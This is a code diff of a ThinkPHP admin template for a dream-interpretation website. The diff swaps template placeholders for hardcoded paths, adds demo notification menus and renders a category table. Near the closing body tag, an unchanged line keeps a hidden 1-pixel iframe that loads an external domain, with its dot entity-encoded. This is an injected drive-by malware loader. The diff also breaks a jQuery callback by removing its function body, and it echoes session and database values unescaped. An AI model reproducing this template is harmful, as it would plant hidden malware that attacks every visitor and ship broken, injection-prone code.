@@ -1,16 +1,16 @@
-<!DOCTYPE html>
+<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
 <html lang="en">
     <head>
         <meta charset="utf-8" />
-        <title>dh2y-RBAC通用后台</title>
-        <meta name="keywords" content="dh2y" />
-        <meta name="description" content="dh2y" />
+        <title>周公解梦- 后台管理系统</title>
+        <meta name="keywords" content="周公解梦" />
+        <meta name="description" content="周公解梦" />
         <!-- basic styles -->
-        <link href="__PUBLIC__/admin/assets/css/bootstrap.min.css" rel="stylesheet" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/font-awesome.min.css" />
+        <link href="/Public/admin/assets/css/bootstrap.min.css" rel="stylesheet" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/font-awesome.min.css" />
 
         <!--[if IE 7]>
-          <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/font-awesome-ie7.min.css" />
+          <link rel="stylesheet" href="/Public/admin/assets/css/font-awesome-ie7.min.css" />
         <![endif]-->
 
         <!-- page specific plugin styles -->
@@ -20,25 +20,25 @@
     
         <!-- ace styles -->
 
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace.min.css" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-rtl.min.css" />
-        <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-skins.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace-rtl.min.css" />
+        <link rel="stylesheet" href="/Public/admin/assets/css/ace-skins.min.css" />
 
         <!--[if lte IE 8]>
-          <link rel="stylesheet" href="__PUBLIC__/admin/assets/css/ace-ie.min.css" />
+          <link rel="stylesheet" href="/Public/admin/assets/css/ace-ie.min.css" />
         <![endif]-->
 
         <!-- inline styles related to this page -->
 
         <!-- ace settings handler -->
 
-        <script src="__PUBLIC__/admin/assets/js/ace-extra.min.js"></script>
+        <script src="/Public/admin/assets/js/ace-extra.min.js"></script>
 
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
 
         <!--[if lt IE 9]>
-        <script src="__PUBLIC__/admin/assets/js/html5shiv.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/respond.min.js"></script>
+        <script src="/Public/admin/assets/js/html5shiv.js"></script>
+        <script src="/Public/admin/assets/js/respond.min.js"></script>
         <![endif]-->
 
         <script type="text/javascript" charset="utf-8">
@@ -55,33 +55,242 @@
 
             <div class="navbar-container" id="navbar-container">
                 <div class="navbar-header pull-left">
-                    <a href="__APP__" class="navbar-brand">
+                    <a href="/admin.php" class="navbar-brand">
                         <small>
                             <i class="icon-leaf"></i>
-                            dh2y后台
+                            周公解梦后台管理
                         </small>
                     </a><!-- /.brand -->
                 </div><!-- /.navbar-header -->
 
                 <div class="navbar-header pull-right" role="navigation">
                     <ul class="nav ace-nav">
+                        <li class="grey">
+                            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
+                                <i class="icon-tasks"></i>
+                                <span class="badge badge-grey">4</span>
+                            </a>
+
+                            <ul class="pull-right dropdown-navbar dropdown-menu dropdown-caret dropdown-close">
+                                <li class="dropdown-header">
+                                    <i class="icon-ok"></i>
+                                    还有4个任务完成
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">软件更新</span>
+                                            <span class="pull-right">65%</span>
+                                        </div>
+
+                                        <div class="progress progress-mini ">
+                                            <div style="width:65%" class="progress-bar "></div>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">硬件更新</span>
+                                            <span class="pull-right">35%</span>
+                                        </div>
+
+                                        <div class="progress progress-mini ">
+                                            <div style="width:35%" class="progress-bar progress-bar-danger"></div>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">单元测试</span>
+                                            <span class="pull-right">15%</span>
+                                        </div>
+
+                                        <div class="progress progress-mini ">
+                                            <div style="width:15%" class="progress-bar progress-bar-warning"></div>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">错误修复</span>
+                                            <span class="pull-right">90%</span>
+                                        </div>
+
+                                        <div class="progress progress-mini progress-striped active">
+                                            <div style="width:90%" class="progress-bar progress-bar-success"></div>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        查看任务详情
+                                        <i class="icon-arrow-right"></i>
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+
+                        <li class="purple">
+                            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
+                                <i class="icon-bell-alt icon-animated-bell"></i>
+                                <span class="badge badge-important">8</span>
+                            </a>
+
+                            <ul class="pull-right dropdown-navbar navbar-pink dropdown-menu dropdown-caret dropdown-close">
+                                <li class="dropdown-header">
+                                    <i class="icon-warning-sign"></i>
+                                    8条通知
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">
+                                                <i class="btn btn-xs no-hover btn-pink icon-comment"></i>
+                                                新闻评论
+                                            </span>
+                                            <span class="pull-right badge badge-info">+12</span>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <i class="btn btn-xs btn-primary icon-user"></i>
+                                        切换为编辑登录..
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#">
+                                        <div class="clearfix">
+                                            <span class="pull-left">
+                                                <i class="btn btn-xs no-hover btn-info icon-twitter"></i>
+                                                粉丝
+                                            </span>
+                                            <span class="pull-right badge badge-info">+11</span>
+                                        </div>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        查看所有通知
+                                        <i class="icon-arrow-right"></i>
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+
+                        <li class="green">
+                            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
+                                <i class="icon-envelope icon-animated-vertical"></i>
+                                <span class="badge badge-success">5</span>
+                            </a>
+
+                            <ul class="pull-right dropdown-navbar dropdown-menu dropdown-caret dropdown-close">
+                                <li class="dropdown-header">
+                                    <i class="icon-envelope-alt"></i>
+                                    5条消息
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <img src="/Public/admin/assets/avatars/avatar.png" class="msg-photo" alt="Alex's Avatar" />
+                                        <span class="msg-body">
+                                            <span class="msg-title">
+                                                <span class="blue">Alex:</span>
+                                                不知道写啥 ...
+                                            </span>
+
+                                            <span class="msg-time">
+                                                <i class="icon-time"></i>
+                                                <span>1分钟以前</span>
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <img src="/Public/admin/assets/avatars/avatar3.png" class="msg-photo" alt="Susan's Avatar" />
+                                        <span class="msg-body">
+                                            <span class="msg-title">
+                                                <span class="blue">Susan:</span>
+                                                不知道翻译...
+                                            </span>
+
+                                            <span class="msg-time">
+                                                <i class="icon-time"></i>
+                                                <span>20分钟以前</span>
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <img src="/Public/admin/assets/avatars/avatar4.png" class="msg-photo" alt="Bob's Avatar" />
+                                        <span class="msg-body">
+                                            <span class="msg-title">
+                                                <span class="blue">Bob:</span>
+                                                到底是不是英文 ...
+                                            </span>
+
+                                            <span class="msg-time">
+                                                <i class="icon-time"></i>
+                                                <span>下午3:15</span>
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="inbox.html">
+                                        查看所有消息
+                                        <i class="icon-arrow-right"></i>
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+
                         <li class="light-blue">
                             <a data-toggle="dropdown" href="#" class="dropdown-toggle">
-                                <img class="nav-user-photo" src="__PUBLIC__/admin/assets/avatars/user.jpg" alt="Jason's Photo" />
+                                <img class="nav-user-photo" src="/Public/admin/assets/avatars/user.jpg" alt="Jason's Photo" />
                                 <span class="user-info">
                                     <small>欢迎光临,</small>
-                                    {$Think.SESSION.admin.name}
+                                    <?php echo ($_SESSION['admin']['name']); ?>
                                 </span>
 
                                 <i class="icon-caret-down"></i>
                             </a>
 
                             <ul class="user-menu pull-right dropdown-menu dropdown-yellow dropdown-caret dropdown-close">
+                                <li>
+                                    <a href="#">
+                                        <i class="icon-cog"></i>
+                                        设置
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="#">
+                                        <i class="icon-user"></i>
+                                        个人资料
+                                    </a>
+                                </li>
 
                                 <li class="divider"></li>
 
                                 <li>
-                                    <a href="__APP__/Login/logOut">
+                                    <a href="/admin.php/Login/logOut">
                                         <i class="icon-off"></i>
                                         退出
                                     </a>
@@ -163,37 +372,37 @@
 
                             <ul class="submenu">
                                  <li>
-                                    <a href="__APP__/Admin/index">
+                                    <a href="/admin.php/Admin/index">
                                         <i class="icon-double-angle-right"></i>
                                         管理员管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Admin/add">
+                                    <a href="/admin.php/Admin/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加管理员
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Group/index">
+                                    <a href="/admin.php/Group/index">
                                         <i class="icon-double-angle-right"></i>
                                         管理组管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Group/add">
+                                    <a href="/admin.php/Group/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加角色
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Rule/index">
+                                    <a href="/admin.php/Rule/index">
                                         <i class="icon-double-angle-right"></i>
                                         权限管理
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="__APP__/Rule/add">
+                                    <a href="/admin.php/Rule/add">
                                         <i class="icon-double-angle-right"></i>
                                         添加权限
                                     </a>
@@ -204,14 +413,27 @@
                         <li>
                             <a href="#" class="dropdown-toggle">
                                 <i class="icon-user"></i>
-                                <span class="menu-text">其他工具</span>
+                                <span class="menu-text"> 解梦管理 </span>
 
                                 <b class="arrow icon-angle-down"></b>
                             </a>
 
                             <ul class="submenu">
                                 <li>
-                                    <a href="__APP__/Build/index">
+                                    <a href="/admin.php/Cate/index">
+                                        <i class="icon-double-angle-right"></i>
+                                        分类管理
+                                    </a>
+                                </li>
+
+                                <li>
+                                    <a href="/admin.php/Dream/index">
+                                        <i class="icon-double-angle-right"></i>
+                                        解梦管理
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="/admin.php/Build/index">
                                         <i class="icon-double-angle-right"></i>
                                         页面静态化
                                     </a>
@@ -231,7 +453,76 @@
                     </script>
                 </div>
 
-                <block name="main"></block>
+                
+    <div class="main-content">
+        <div class="breadcrumbs" id="breadcrumbs">
+            <ul class="breadcrumb">
+                <li>
+                    <i class="icon-home home-icon"></i>
+                    <a href="/admin.php">主页</a>
+                </li>
+
+                <li>
+                    <a href="#">分类管理</a>
+                </li>
+                <li class="active">分类列表</li>
+            </ul><!-- .breadcrumb -->
+        </div>
+
+        <div class="page-content">
+            <div class="page-header">
+                <h1>
+                    分类管理
+                    <small>
+                        <i class="icon-double-angle-right"></i>
+                        <a href="/admin.php/Cate/add">添加分类</a>
+                    </small>
+                </h1>
+            </div><!-- /.page-header -->
+
+            <div class="row">
+                <div class="col-xs-12">
+                    <!-- PAGE CONTENT BEGINS -->
+                    <div class="row">
+                        <div class="col-xs-12">
+                            <div class="table-responsive">
+                                <table id="sample-table-1" class="table table-striped table-bordered table-hover">
+                                    <thead>
+                                    <tr>
+                                            <th>分类ID</th>
+                                            <th>分类名称</th>
+                                            <th>
+                                                操作
+                                            </th>
+                                    </tr>
+                                    </thead>
+
+                                    <tbody>
+
+                                    <?php if(is_array($data)): foreach($data as $key=>$cate): ?><tr>
+                                            <td>
+                                                <?php echo ($cate['id']); ?>
+                                            </td>
+                                            <td><?php echo ($cate['cate_name']); ?></td>
+                                            <td>
+                                                <div class="visible-md visible-lg hidden-sm hidden-xs btn-group">
+                                                    <a href="/admin.php/Cate/edit/id/<?php echo ($cate['id']); ?>">
+                                                        修改名称
+                                                    </a>
+                                                </div>
+                                            </td>
+                                        </tr><?php endforeach; endif; ?>
+                                    </tbody>
+                                </table>
+                            </div><!-- /.table-responsive -->
+                        </div><!-- /span -->
+                    </div><!-- /row -->
+                    <div class="hr hr-18 dotted hr-double"></div>
+                    <div class="hr hr-18 dotted hr-double"></div>
+                </div><!-- /.row -->
+            </div><!-- /.page-content -->
+        </div><!-- /.main-content -->
+
                 <!-- /.main-content -->
 
                 <div class="ace-settings-container" id="ace-settings-container">
@@ -293,55 +584,55 @@
 
         <!--[if !IE]> -->
 
-        <!--<script src="__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js"></script>-->
-        <script src="__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js"></script>
+        <!--<script src="/Public/admin/assets/js/jquery-2.0.3.min.js"></script>-->
+        <script src="/Public/admin/assets/js/jquery-2.0.3.min.js"></script>
         
 
         <!-- <![endif]-->
 
         <!--[if IE]>
-<script src="__PUBLIC__/admin/assets/js/jquery-1.10.2.min.js"></script>
+<script src="/Public/admin/assets/js/jquery-1.10.2.min.js"></script>
 <![endif]-->
 
         <!--[if !IE]> -->
 
         <script type="text/javascript">
-            window.jQuery || document.write("<script src='__PUBLIC__/admin/assets/js/jquery-2.0.3.min.js'>"+"<"+"script>");
+            window.jQuery || document.write("<script src='/Public/admin/assets/js/jquery-2.0.3.min.js'>"+"<"+"script>");
         </script>
 
         <!-- <![endif]-->
 
         <!--[if IE]>
 <script type="text/javascript">
- window.jQuery || document.write("<script src='__PUBLIC__/admin/assets/js/jquery-1.10.2.min.js'>"+"<"+"script>");
+ window.jQuery || document.write("<script src='/Public/admin/assets/js/jquery-1.10.2.min.js'>"+"<"+"script>");
 </script>
 <![endif]-->
 
         <script type="text/javascript">
-            if("ontouchend" in document) document.write("<script src='__PUBLIC__/admin/assets/js/jquery.mobile.custom.min.js'>"+"<"+"script>");
+            if("ontouchend" in document) document.write("<script src='/Public/admin/assets/js/jquery.mobile.custom.min.js'>"+"<"+"script>");
         </script>
-        <script src="__PUBLIC__/admin/assets/js/bootstrap.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/typeahead-bs2.min.js"></script>
+        <script src="/Public/admin/assets/js/bootstrap.min.js"></script>
+        <script src="/Public/admin/assets/js/typeahead-bs2.min.js"></script>
 
         <!-- page specific plugin scripts -->
 
         <!--[if lte IE 8]>
-          <script src="__PUBLIC__/admin/assets/js/excanvas.min.js"></script>
+          <script src="/Public/admin/assets/js/excanvas.min.js"></script>
         <![endif]-->
 
-        <script src="__PUBLIC__/admin/assets/js/jquery-ui-1.10.3.custom.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.ui.touch-punch.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.slimscroll.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.easy-pie-chart.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/jquery.sparkline.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.pie.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/flot/jquery.flot.resize.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery-ui-1.10.3.custom.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.ui.touch-punch.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.slimscroll.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.easy-pie-chart.min.js"></script>
+        <script src="/Public/admin/assets/js/jquery.sparkline.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.pie.min.js"></script>
+        <script src="/Public/admin/assets/js/flot/jquery.flot.resize.min.js"></script>
 
         <!-- ace scripts -->
 
-        <script src="__PUBLIC__/admin/assets/js/ace-elements.min.js"></script>
-        <script src="__PUBLIC__/admin/assets/js/ace.min.js"></script>
+        <script src="/Public/admin/assets/js/ace-elements.min.js"></script>
+        <script src="/Public/admin/assets/js/ace.min.js"></script>
 
         <!-- inline scripts related to this page -->
 
@@ -526,9 +817,7 @@
                     placeholder: 'draggable-placeholder',
                     forcePlaceholderSize:true,
                     tolerance:'pointer',
-                    stop: function( event, ui ) {//just for Chrome!!!! so that dropdowns on items don't appear below other items after being moved
-                        $(ui.item).css('z-index', 'auto');
-                    }
+                    stop: function( event, ui ) 
                     }
                 );
                 $('#tasks').disableSelection();
@@ -543,6 +832,5 @@
         </script>
     <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
-    <block name="miss_js"></block>
+    
 </html>
-
